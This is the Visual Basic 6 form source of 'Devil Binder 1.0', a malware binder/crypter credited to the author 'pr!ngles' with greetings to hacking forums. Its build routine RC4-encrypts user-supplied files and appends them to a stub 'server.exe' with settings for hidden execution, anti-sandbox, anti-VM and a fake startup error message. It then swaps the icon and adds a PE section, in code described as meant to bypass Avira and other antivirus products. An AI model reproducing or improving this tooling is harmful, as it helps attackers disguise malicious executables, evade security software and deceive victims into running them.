VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.1#0"; "CODEJO~3.OCX"
Object = "{9664F006-7A8C-474C-AF49-1D761EBE5855}#1.0#0"; "prjXTab.ocx"
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   ClientHeight    =   4575
   ClientLeft      =   150
   ClientTop       =   720
   ClientWidth     =   9990
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4575
   ScaleWidth      =   9990
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   Begin prjXTab.XTab XTab1 
      Height          =   4335
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   9735
      _ExtentX        =   17171
      _ExtentY        =   7646
      TabCount        =   4
      TabCaption(0)   =   "Files"
      TabContCtrlCnt(0)=   1
      Tab(0)ContCtrlCap(1)=   "lv_files"
      TabCaption(1)   =   "Settings"
      TabContCtrlCnt(1)=   4
      Tab(1)ContCtrlCap(1)=   "GroupBox4"
      Tab(1)ContCtrlCap(2)=   "GroupBox3"
      Tab(1)ContCtrlCap(3)=   "GroupBox2"
      Tab(1)ContCtrlCap(4)=   "GroupBox1"
      TabCaption(2)   =   "Build"
      TabContCtrlCnt(2)=   3
      Tab(2)ContCtrlCap(1)=   "lv_status"
      Tab(2)ContCtrlCap(2)=   "GroupBox6"
      Tab(2)ContCtrlCap(3)=   "PushButton4"
      TabCaption(3)   =   "About"
      TabContCtrlCnt(3)=   4
      Tab(3)ContCtrlCap(1)=   "GroupBox8"
      Tab(3)ContCtrlCap(2)=   "GroupBox7"
      Tab(3)ContCtrlCap(3)=   "GroupBox5"
      Tab(3)ContCtrlCap(4)=   "FlatEdit1"
      ActiveTab       =   3
      TabTheme        =   3
      ActiveTabBackStartColor=   16316664
      InActiveTabBackStartColor=   15066597
      InActiveTabBackEndColor=   -2147483626
      ActiveTabForeColor=   10972496
      InActiveTabForeColor=   9474192
      BeginProperty ActiveTabFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty InActiveTabFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      OuterBorderColor=   9474192
      DisabledTabBackColor=   -2147483633
      DisabledTabForeColor=   -2147483627
      Begin XtremeSuiteControls.ListView lv_files 
         Height          =   3375
         Left            =   -74880
         TabIndex        =   1
         Top             =   720
         Width           =   9495
         _Version        =   786433
         _ExtentX        =   16748
         _ExtentY        =   5953
         _StockProps     =   77
         BackColor       =   -2147483643
         View            =   3
         GridLines       =   -1  'True
         FullRowSelect   =   -1  'True
      End
      Begin XtremeSuiteControls.ListView lv_status 
         Height          =   3135
         Left            =   -74880
         TabIndex        =   20
         Top             =   600
         Width           =   5895
         _Version        =   786433
         _ExtentX        =   10398
         _ExtentY        =   5530
         _StockProps     =   77
         BackColor       =   -2147483643
         View            =   3
         GridLines       =   -1  'True
         FullRowSelect   =   -1  'True
      End
      Begin XtremeSuiteControls.GroupBox GroupBox8 
         Height          =   1815
         Left            =   3600
         TabIndex        =   43
         Top             =   2280
         Width           =   3255
         _Version        =   786433
         _ExtentX        =   5741
         _ExtentY        =   3201
         _StockProps     =   79
         Caption         =   "       - Greetz to"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin VB.Label Label22 
            BackStyle       =   0  'Transparent
            Caption         =   "1337crew.to"
            Height          =   255
            Left            =   120
            TabIndex        =   48
            Top             =   720
            Width           =   975
         End
         Begin VB.Label Label21 
            BackStyle       =   0  'Transparent
            Caption         =   "hackhound.org"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   47
            Top             =   480
            Width           =   1455
         End
         Begin VB.Label Label18 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "free-hack.com"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   46
            Top             =   960
            Width           =   1230
         End
         Begin VB.Label Label17 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "vb-community.eu"
            Height          =   195
            Left            =   120
            TabIndex        =   45
            Top             =   1200
            Width           =   1245
         End
         Begin VB.Label Label16 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "opensc.ws"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   44
            Top             =   1440
            Width           =   870
         End
         Begin VB.Image Image9 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":15162
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox7 
         Height          =   1575
         Left            =   3600
         TabIndex        =   40
         Top             =   600
         Width           =   3255
         _Version        =   786433
         _ExtentX        =   5741
         _ExtentY        =   2778
         _StockProps     =   79
         Caption         =   "       - Credits to"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin VB.Label Label23 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Code to bypass Avira :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   50
            Top             =   1080
            Width           =   1875
         End
         Begin VB.Label Label15 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "dr.kane @hackhound.org"
            Height          =   195
            Left            =   120
            TabIndex        =   49
            Top             =   1320
            Width           =   1830
         End
         Begin VB.Label Label20 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "ZeR0 @hackhound.org"
            Height          =   195
            Left            =   120
            TabIndex        =   42
            Top             =   720
            Width           =   1650
         End
         Begin VB.Label Label19 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Coder of Iconchanger :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   41
            Top             =   480
            Width           =   1905
         End
         Begin VB.Image Image8 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":153DB
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox5 
         Height          =   2415
         Left            =   120
         TabIndex        =   33
         Top             =   600
         Width           =   3255
         _Version        =   786433
         _ExtentX        =   5741
         _ExtentY        =   4260
         _StockProps     =   79
         Caption         =   "       - About me"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin VB.Image Image6 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":15811
            Top             =   0
            Width           =   240
         End
         Begin VB.Label Label14 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "pringles1337@live.de"
            Height          =   195
            Left            =   120
            TabIndex        =   39
            Top             =   1920
            Width           =   1545
         End
         Begin VB.Label Label13 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Msn:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   38
            Top             =   1680
            Width           =   390
         End
         Begin VB.Label Label12 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "576826717"
            Height          =   195
            Left            =   120
            TabIndex        =   37
            Top             =   1320
            Width           =   810
         End
         Begin VB.Label Label11 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Icq :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   36
            Top             =   1080
            Width           =   360
         End
         Begin VB.Label Label9 
            BackStyle       =   0  'Transparent
            Caption         =   "Coder :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   35
            Top             =   480
            Width           =   1455
         End
         Begin VB.Label Label10 
            BackStyle       =   0  'Transparent
            Caption         =   "pr!ngles"
            Height          =   255
            Left            =   120
            TabIndex        =   34
            Top             =   720
            Width           =   975
         End
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit1 
         Height          =   30
         Left            =   9465
         TabIndex        =   31
         Top             =   4065
         Visible         =   0   'False
         Width           =   30
         _Version        =   786433
         _ExtentX        =   53
         _ExtentY        =   53
         _StockProps     =   77
         BackColor       =   -2147483643
         Text            =   "FlatEdit1"
      End
      Begin XtremeSuiteControls.GroupBox GroupBox6 
         Height          =   1215
         Left            =   -68880
         TabIndex        =   22
         Top             =   480
         Width           =   3495
         _Version        =   786433
         _ExtentX        =   6165
         _ExtentY        =   2143
         _StockProps     =   79
         Caption         =   "       - Information"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin VB.Label Label7 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "0"
            Height          =   195
            Left            =   1560
            TabIndex        =   26
            Top             =   720
            Width           =   90
         End
         Begin VB.Label Label6 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Total Filesize(mb) :"
            Height          =   195
            Left            =   120
            TabIndex        =   25
            Top             =   720
            Width           =   1350
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "-"
            Height          =   195
            Left            =   1080
            TabIndex        =   24
            Top             =   480
            Width           =   60
         End
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Total Files :"
            Height          =   195
            Left            =   120
            TabIndex        =   23
            Top             =   480
            Width           =   825
         End
         Begin VB.Image Image7 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":15A9B
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.PushButton PushButton4 
         Height          =   375
         Left            =   -70560
         TabIndex        =   21
         Top             =   3840
         Width           =   1575
         _Version        =   786433
         _ExtentX        =   2778
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Build Server"
         BackColor       =   16316664
         UseVisualStyle  =   -1  'True
         Picture         =   "Form1.frx":15D25
      End
      Begin XtremeSuiteControls.GroupBox GroupBox4 
         Height          =   2295
         Left            =   -68280
         TabIndex        =   16
         Top             =   600
         Width           =   2895
         _Version        =   786433
         _ExtentX        =   5106
         _ExtentY        =   4048
         _StockProps     =   79
         Caption         =   "       - Fake Message on Startup"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin XtremeSuiteControls.CheckBox check_message 
            Height          =   255
            Left            =   1320
            TabIndex        =   27
            Top             =   1920
            Width           =   1455
            _Version        =   786433
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Show on Startup"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton PushButton3 
            Height          =   255
            Left            =   120
            TabIndex        =   19
            Top             =   1920
            Width           =   1095
            _Version        =   786433
            _ExtentX        =   1931
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Test"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txt_title 
            Height          =   255
            Left            =   120
            TabIndex        =   17
            Top             =   480
            Width           =   2655
            _Version        =   786433
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Alignment       =   2
         End
         Begin XtremeSuiteControls.FlatEdit txt_message 
            Height          =   975
            Left            =   120
            TabIndex        =   18
            Top             =   840
            Width           =   2655
            _Version        =   786433
            _ExtentX        =   4683
            _ExtentY        =   1720
            _StockProps     =   77
            BackColor       =   -2147483643
            Alignment       =   2
            MaxLength       =   255
         End
         Begin VB.Image Image5 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":15FBE
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox3 
         Height          =   3615
         Left            =   -71520
         TabIndex        =   8
         Top             =   600
         Width           =   3135
         _Version        =   786433
         _ExtentX        =   5530
         _ExtentY        =   6376
         _StockProps     =   79
         Caption         =   "       - Antis"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin XtremeSuiteControls.ListView lv_anti 
            Height          =   1575
            Left            =   120
            TabIndex        =   12
            Top             =   1200
            Width           =   2895
            _Version        =   786433
            _ExtentX        =   5106
            _ExtentY        =   2778
            _StockProps     =   77
            BackColor       =   -2147483643
            View            =   3
            GridLines       =   -1  'True
            FullRowSelect   =   -1  'True
         End
         Begin XtremeSuiteControls.PushButton PushButton2 
            Height          =   255
            Left            =   2520
            TabIndex        =   15
            Top             =   3120
            Width           =   495
            _Version        =   786433
            _ExtentX        =   873
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Add"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit FlatEdit2 
            Height          =   255
            Left            =   120
            TabIndex        =   14
            Top             =   3120
            Width           =   2295
            _Version        =   786433
            _ExtentX        =   4048
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
         End
         Begin XtremeSuiteControls.CheckBox check_sandbox 
            Height          =   255
            Left            =   120
            TabIndex        =   9
            Top             =   360
            Width           =   1575
            _Version        =   786433
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Sandboxie"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.CheckBox check_VM 
            Height          =   255
            Left            =   120
            TabIndex        =   10
            Top             =   600
            Width           =   1575
            _Version        =   786433
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti VM"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Label Label3 
            BackStyle       =   0  'Transparent
            Caption         =   "Title of Window :"
            Height          =   255
            Left            =   120
            TabIndex        =   13
            Top             =   2880
            Width           =   1815
         End
         Begin VB.Label Label2 
            BackStyle       =   0  'Transparent
            Caption         =   "Anti List :"
            Height          =   255
            Left            =   120
            TabIndex        =   11
            Top             =   960
            Width           =   975
         End
         Begin VB.Image Image4 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":16254
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox2 
         Height          =   1335
         Left            =   -74880
         TabIndex        =   6
         Top             =   2880
         Width           =   3255
         _Version        =   786433
         _ExtentX        =   5741
         _ExtentY        =   2355
         _StockProps     =   79
         Caption         =   "       - Encryption Settings"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   2
         Begin XtremeSuiteControls.PushButton PushButton5 
            Height          =   255
            Left            =   2400
            TabIndex        =   30
            Top             =   960
            Width           =   735
            _Version        =   786433
            _ExtentX        =   1296
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Random"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txt_key 
            Height          =   255
            Left            =   120
            TabIndex        =   29
            Top             =   960
            Width           =   2175
            _Version        =   786433
            _ExtentX        =   3836
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            MaxLength       =   20
         End
         Begin XtremeSuiteControls.RadioButton RadioButton1 
            Height          =   255
            Left            =   120
            TabIndex        =   7
            Top             =   360
            Width           =   615
            _Version        =   786433
            _ExtentX        =   1085
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "RC4"
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
            Value           =   -1  'True
         End
         Begin VB.Label Label8 
            BackStyle       =   0  'Transparent
            Caption         =   "Key :"
            Height          =   255
            Left            =   120
            TabIndex        =   28
            Top             =   720
            Width           =   975
         End
         Begin VB.Image Image3 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":164D6
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox1 
         Height          =   1815
         Left            =   -74880
         TabIndex        =   2
         Top             =   600
         Width           =   3255
         _Version        =   786433
         _ExtentX        =   5741
         _ExtentY        =   3201
         _StockProps     =   79
         Caption         =   "       - Icon changer"
         BackColor       =   16316664
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Appearance      =   3
         Begin XtremeSuiteControls.PushButton PushButton1 
            Height          =   255
            Left            =   2760
            TabIndex        =   5
            Top             =   720
            Width           =   375
            _Version        =   786433
            _ExtentX        =   661
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "..."
            BackColor       =   16316664
            UseVisualStyle  =   -1  'True
         End
         Begin XtremeSuiteControls.FlatEdit txt_icon 
            Height          =   255
            Left            =   120
            TabIndex        =   4
            Top             =   720
            Width           =   2535
            _Version        =   786433
            _ExtentX        =   4471
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
         End
         Begin VB.Image Image2 
            Height          =   480
            Left            =   120
            Picture         =   "Form1.frx":1675D
            Top             =   1080
            Width           =   480
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Ico file :"
            Height          =   195
            Left            =   120
            TabIndex        =   3
            Top             =   480
            Width           =   585
         End
         Begin VB.Image Image1 
            Height          =   240
            Left            =   120
            Picture         =   "Form1.frx":2B8BF
            Top             =   0
            Width           =   240
         End
      End
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit3 
      Height          =   375
      Left            =   3240
      TabIndex        =   32
      Top             =   4680
      Width           =   615
      _Version        =   786433
      _ExtentX        =   1085
      _ExtentY        =   661
      _StockProps     =   77
      BackColor       =   -2147483643
      Text            =   "FlatEdit3"
   End
   Begin XtremeSuiteControls.CommonDialog dlg 
      Left            =   0
      Top             =   4440
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog cd 
      Left            =   360
      Top             =   4440
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin VB.Menu main 
      Caption         =   "main"
      Visible         =   0   'False
      Begin VB.Menu mnu_add 
         Caption         =   "Add File"
      End
      Begin VB.Menu mnu_settings 
         Caption         =   "File Settings"
      End
   End
   Begin VB.Menu antis 
      Caption         =   "antis"
      Visible         =   0   'False
      Begin VB.Menu anti_delete 
         Caption         =   "Delete"
      End
   End
   Begin VB.Menu c 
      Caption         =   "Coded by pr!ngles"
      Enabled         =   0   'False
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Programm  : Devil Binder 1.0
' Author    : pr!ngles
' Contact   : pringles1337@live.de (msn) or 576826717 (icq)
' realease  : 28.09.09
' Tested On : Windows Vista
' Credits to:
'            ZeR0 for Iconchanger
'            dr.kane for bypass Avira Code
'
'Please leave credits to me if you take something of from my binder or if you ripp it
'---------------------------------------------------------------------------------------


Private Sub anti_delete_Click()
On Error Resume Next
lv_anti.ListItems.Remove (lv_anti.SelectedItem.Index)
End Sub

Private Sub Command1_Click()

End Sub

Private Sub Form_Load()
lv_files.ColumnHeaders.Add , , "File", 3300
lv_files.ColumnHeaders.Add , , "Run/Hidden", 1000
lv_files.ColumnHeaders.Add , , "Exctract to", 1500
lv_files.ColumnHeaders.Add , , "Filename after extract", 1500
lv_files.ColumnHeaders.Add , , "Size(mb)", 1000

lv_status.ColumnHeaders.Add , , "Time", 1200
lv_status.ColumnHeaders.Add , , "Status", 4500

lv_anti.ColumnHeaders.Add , , "Name", 2895

txt_key = pass("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 20)
End Sub

Private Sub lv_anti_MouseDown(Button As Integer, Shift As Integer, x As Single, Y As Single)
If Button = 2 Then
    PopupMenu antis
End If

End Sub

Private Sub lv_files_DblClick()
If lv_files.ListItems.Count = 0 Then Exit Sub
On Error Resume Next

Form2.Show

For i = 1 To lv_files.ListItems.Count
    Form2.c_files.AddItem lv_files.ListItems(i).Text
Next

Form2.c_files.ListIndex = lv_files.SelectedItem.Index - 1

End Sub

Private Sub lv_files_MouseDown(Button As Integer, Shift As Integer, x As Single, Y As Single)
If Button = 2 Then
    PopupMenu main
End If

End Sub

Private Sub mnu_add_Click()
cd.ShowOpen

If cd.filename <> "" Then

    Dim filename() As String
    filename = Split(cd.filename, "\")
    
    
    With lv_files.ListItems.Add
    .Text = cd.filename
    .SubItems(1) = "no/no"
    .SubItems(2) = "AppPath"
    .SubItems(3) = filename(UBound(filename))
    .SubItems(4) = FormatNumber((FileLen(cd.filename) / 1048576), 3)
    End With
End If
End Sub

Private Sub mnu_settings_Click()
If lv_files.ListItems.Count = 0 Then Exit Sub
On Error Resume Next

Form2.Show

For i = 1 To lv_files.ListItems.Count
    Form2.c_files.AddItem lv_files.ListItems(i).Text
Next

Form2.c_files.ListIndex = lv_files.SelectedItem.Index - 1

End Sub

Private Sub PushButton1_Click()
On Error Resume Next

    With dlg
        .DialogTitle = "Select Icon File..."
        .Filter = "Icons (*.ico)|*.ico"
        .ShowOpen
    End With
    DoEvents
    txt_icon.Text = dlg.filename
    Image2.Picture = LoadPicture(dlg.filename)
End Sub

Private Sub PushButton2_Click()
lv_anti.ListItems.Add , , FlatEdit2
FlatEdit2 = ""
End Sub

Private Sub PushButton3_Click()
MsgBox txt_message, vbCritical, txt_title
End Sub

Private Sub PushButton4_Click()
lv_status.ListItems.Clear
Dim f As Integer
f = FreeFile
Dim file As String
Dim buffer() As Byte
rc_key = txt_key.Text

If rc_key = "" Then
    txt_key = pass("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 20)
    rc_key = txt_key
    With lv_status.ListItems.Add
    .Text = Time
    .SubItems(1) = "No Key found... Made a new : " & rc_key
    End With
End If

If IsNumeric(txt_kb) = False Then
    txt_kb = "0"
End If




With lv_status.ListItems.Add
.Text = Time
.SubItems(1) = "Writing Stub.."
End With

buffer = LoadResData(101, "CUSTOM")

Open App.Path & "\server.exe" For Binary As #f
Put #f, , buffer
Close #f

With lv_status.ListItems.Add
.Text = Time
.SubItems(1) = "Writing Settings.."
End With

'################## SETTINGS
    settings = "key=" & txt_key
    settings = settings & "#'#'#"
    If check_sandbox.Value = xtpChecked Then
        settings = settings & "sand=1"
    Else
        settings = settings & "sand=0"
    End If
    settings = settings & "#'#'#"
    
    If check_VM.Value = xtpChecked Then
        settings = settings & "vm=1"
    Else
        settings = settings & "vm=0"
    End If
    settings = settings & "#'#'#"
    
    If lv_anti.ListItems.Count = 0 Then
        settings = settings & "antis=0"
    Else
        For i = 1 To lv_anti.ListItems.Count
            antii = antii & lv_anti.ListItems(i) & "ä/ä"
        Next
        
        settings = settings & "anti=" & antii
    End If
    
    settings = settings & "#'#'#"
    
    If check_message.Value = xtpChecked Then
        settings = settings & "mess=1" & "ä&ä" & txt_title & "ä&ä" & txt_message
    Else
        settings = settings & "mess=0"
    End If


Open App.Path & "\server.exe" For Binary As #f
Put #f, LOF(f) + 1, "#~~~+*()*+~~~#" & settings
Close #f
    
For i = 1 To lv_files.ListItems.Count

    With lv_status.ListItems.Add
    .Text = Time
    .SubItems(1) = "Reading File " & i & " of " & lv_files.ListItems.Count
    End With

    DoEvents
    
    Open lv_files.ListItems(i).Text For Binary As #f
    file = Space(LOF(f))
    Get #f, , file
    Close #f
    
    With lv_status.ListItems.Add
    .Text = Time
    .SubItems(1) = "Crypting/Writing File and Settings from " & i & " of " & lv_files.ListItems.Count
    End With
    
    
    Open App.Path & "\server.exe" For Binary As #f
    Put #f, LOF(f) + 1, "#~~~+*()*+~~~#" & RC4(file, rc_key) & "%%%%%" & "run=" & lv_files.ListItems(i).SubItems(1) & "~~~~~~extract=" & lv_files.ListItems(i).SubItems(2) & "~~~~~~filename=" & lv_files.ListItems(i).SubItems(3)
    Close #f 'RC4(file, rc_key)

    file = ""
Next

    If txt_icon <> "" Then
        With lv_status.ListItems.Add
        .Text = Time
        .SubItems(1) = "Changing icon.."
        End With
        
        If ChangeIcon(App.Path & "\server.exe", Image2.Picture) = True Then
            With lv_status.ListItems.Add
            .Text = Time
            .SubItems(1) = "Icon changed.."
            End With
        Else
            With lv_status.ListItems.Add
            .Text = Time
            .SubItems(1) = "Error while changing icon.."
            End With
        End If
    End If
    
    With lv_status.ListItems.Add
    .Text = Time
    .SubItems(1) = "Add code to bypass Avira & Co..."
    End With
    
    Dim strFinaldatei As String
    
    Open App.Path & "\server.exe" For Binary As #1
    strFinaldatei = Space(LOF(1))
    Get #1, , strFinaldatei
    Close #1
    
    DoEvents
    AddSection App.Path & "\server.exe", ".qip", Len(strFinaldatei), &H8000000F
    DoEvents

    With lv_status.ListItems.Add
    .Text = Time
    .SubItems(1) = "Server.exe created sucessfully!"
    End With
End Sub

Function ShowFileSize(file)
    Dim fs, f, s
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFile(file)
    ShowFileSize = f.Size

End Function

Private Sub PushButton5_Click()
txt_key = pass("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", 20)
End Sub

Private Function pass(zeichen As String, länge As Long)

For i = 1 To länge
    pass = pass & Mid(zeichen, Int(Rnd * (Len(zeichen)) + 1), 1)
Next


End Function

Private Sub XTab1_Click()
If XTab1.ActiveTab = 1 Then txt_icon.SetFocus
If XTab1.ActiveTab = 0 Then lv_files.SetFocus
If XTab1.ActiveTab = 3 Then FlatEdit3.SetFocus
If XTab1.ActiveTab = 2 Then
    lv_status.SetFocus
    Label7 = "0"
    Label5 = lv_files.ListItems.Count
    For i = 1 To lv_files.ListItems.Count
        Label7 = FormatNumber(CSng(Label7) + lv_files.ListItems(i).SubItems(4), 3)
    Next
End If

End Sub
